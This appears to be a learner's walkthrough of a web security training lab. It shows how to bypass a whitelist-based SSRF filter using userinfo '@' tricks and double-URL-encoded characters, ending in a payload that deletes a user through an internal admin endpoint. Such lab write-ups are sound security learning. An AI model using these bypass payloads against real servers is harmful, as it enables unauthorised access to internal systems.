# **SSRF with whitelist-based input filter**

Task: This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.

Toolkit: Burpsuite, Browser

1. stockApi=http%3A%2F%[2Fstock.weliketoshop.net](http://2Fstock.weliketoshop.net)%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1

we see this one in normal req

- decode

[http://stock.weliketoshop.net:8080/product/stock/check?productId=1\&storeId=1](http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1)

2. if we change stockapi

stockApi=[http://localhost](http://localhost)  
RESP:  
HTTP/2 400 Bad Request  
Content-Type: application/json; charset=utf-8  
X-Frame-Options: SAMEORIGIN  
Content-Length: 58

"External stock check host must be [stock.weliketoshop.net](http://stock.weliketoshop.net)"  
This is white list

3. so we try to save this host and add localhost

stockApi=[http://localhost@stock.weliketoshop.net:8080/product/stock/check?productId=1\&storeId=1](http://localhost@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1)

HTTP/2 400 Bad Request  
Content-Type: application/json; charset=utf-8  
X-Frame-Options: SAMEORIGIN  
Content-Length: 19

"Missing parameter"

4. there is many ways you can do this, we can get it through sniper attack and this site [https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

![][image1]  
![][image2]  
and unable URL encode all characters  
![][image3]

stockApi=[http://localhost%2523%40stock.weliketoshop.net:8080](http://localhost%2523%40stock.weliketoshop.net:8080)  
stockApi=http://localhost%252f%40stock.weliketoshop.net:8080

and we get 200 ok\!\!

5. stockApi=[http://localhost%25%32%33](http://localhost%25%32%33@stock.weliketoshop.net:8080/admin/delete?username=carlos)[%40](http://localhost%2523%40stock.weliketoshop.net:8080)[stock.weliketoshop.net:8080/admin/delete?username=carlos](http://localhost%25%32%33@stock.weliketoshop.net:8080/admin/delete?username=carlos)

this is the final REQ
